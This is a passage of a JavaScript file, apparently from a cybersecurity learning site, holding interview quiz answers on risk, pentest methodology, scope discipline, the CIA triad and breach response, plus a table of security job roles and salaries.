    <div class="quiz-q"><div class="quiz-q-num">Q2</div><div class="quiz-q-text">"What is the difference between a vulnerability, a threat, and a risk?"</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>Vulnerability:</strong> A weakness in a system (unpatched software, weak password, misconfiguration).<br><strong>Threat:</strong> A potential event that could exploit a vulnerability (attacker, malware, insider).<br><strong>Risk:</strong> The probability of a threat exploiting a vulnerability multiplied by the potential impact. Risk = Likelihood × Impact.<br><br>Example: An unpatched SQL injection (vulnerability) + external attacker (threat) + accessible internet-facing login page = HIGH risk.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q3</div><div class="quiz-q-text">"How would you approach a black-box web application pentest?"</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">1. <strong>Reconnaissance:</strong> Subdomain enum, DNS, OSINT, Google dorks. 2. <strong>Mapping:</strong> Crawl all endpoints, parameters, and functionality. 3. <strong>Authentication testing:</strong> Default creds, brute force, auth bypass. 4. <strong>Input validation:</strong> Test every parameter for SQLi, XSS, command injection. 5. <strong>Access control:</strong> IDOR testing, privilege escalation, horizontal access. 6. <strong>Configuration review:</strong> Security headers, error messages, info disclosure. 7. <strong>Business logic:</strong> Test workflows for logic flaws. 8. <strong>Report:</strong> Document with PoC, severity, remediation.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q4</div><div class="quiz-q-text">"You discover a critical vulnerability in a system during a pentest that's out of scope. What do you do?"</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">Stop testing immediately — do not exploit it or access any data. Document exactly what I observed (URL, parameter, brief description of the potential vulnerability type) without further investigation. Immediately notify the client/programme manager and document the notification. Let them decide how to handle it. This protects both me legally and the client from ongoing exposure. Professionalism here builds trust and often leads to expanded scope or additional work.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q5</div><div class="quiz-q-text">"Explain the CIA triad."</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>Confidentiality:</strong> Data is only accessible to authorised parties. Attacks: eavesdropping, data theft, credential compromise. Controls: encryption, access control, need-to-know.<br><br><strong>Integrity:</strong> Data has not been tampered with. Attacks: SQL injection modifying data, MITM altering traffic, ransomware encrypting files. Controls: hashing, digital signatures, access control.<br><br><strong>Availability:</strong> Systems are accessible when needed. Attacks: DDoS, ransomware, hardware failure. Controls: redundancy, backups, DDoS mitigation, disaster recovery.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q6</div><div class="quiz-q-text">"What would you do in the first hour of responding to a suspected breach?"</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">1. <strong>Don't panic, don't act hastily.</strong> 2. Activate incident response plan. 3. Preserve evidence — take memory dumps, disk images of affected systems BEFORE rebooting. 4. Isolate affected systems from the network (don't turn off — live forensics first). 5. Identify the scope: what systems are affected? How long has this been happening? 6. Check logs: auth.log, web logs, firewall logs. 7. Identify indicators of compromise (IOCs): new accounts, unusual processes, suspicious network connections. 8. Notify relevant stakeholders. 9. Begin containment while preserving evidence chain of custody.</div></div>
  </div>
</div>

<div class="section-label">Job Roles in Cybersecurity</div>
<div class="table-wrap">
<table>
<thead><tr><th>Role</th><th>Focus</th><th>Average Salary (UK/US)</th></tr></thead>
<tbody>
<tr><td><strong>Penetration Tester</strong></td><td>Offensively test systems with permission. Find vulns before attackers.</td><td>£45–85k / $70–130k</td></tr>
<tr><td><strong>Security Analyst (SOC)</strong></td><td>Monitor alerts, investigate incidents, triage threats. Entry-level friendly.</td><td>£30–55k / $55–90k</td></tr>
<tr><td><strong>Bug Bounty Hunter</strong></td><td>Independent contractor. Find vulns in bug bounty programmes. Unlimited ceiling.</td><td>Varies widely / $0–1M+</td></tr>
<tr><td><strong>Red Teamer</strong></td><td>Advanced adversary simulation. Social engineering, physical, technical. Senior role.</td><td>£60–100k / $100–180k</td></tr>
<tr><td><strong>Security Engineer</strong></td><td>Build and maintain security systems. WAFs, SIEM, security tooling.</td><td>£55–95k / $110–180k</td></tr>
<tr><td><strong>Malware Analyst</strong></td><td>Reverse engineer malicious software to understand TTPs and IOCs.</td><td>£45–80k / $80–140k</td></tr>
<tr><td><strong>CISO</strong></td><td>Chief Information Security Officer. Strategic leadership of security programme.</td><td>£120–200k / $180–350k</td></tr>
</tbody>
</table>
</div>`

}; // end CHAPTERS

// ── RENDER ALL CHAPTERS ──────────────────────────────────
function initChapters() {
  const contentArea = document.getElementById('contentArea');
  Object.entries(CHAPTERS).forEach(([id, html]) => {
    const div = document.createElement('div');
    div.className = 'chapter';
    div.id = id;
    div.innerHTML = html;
    contentArea.appendChild(div);
  });
}

// Init on load
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initChapters);
} else {
  initChapters();
}
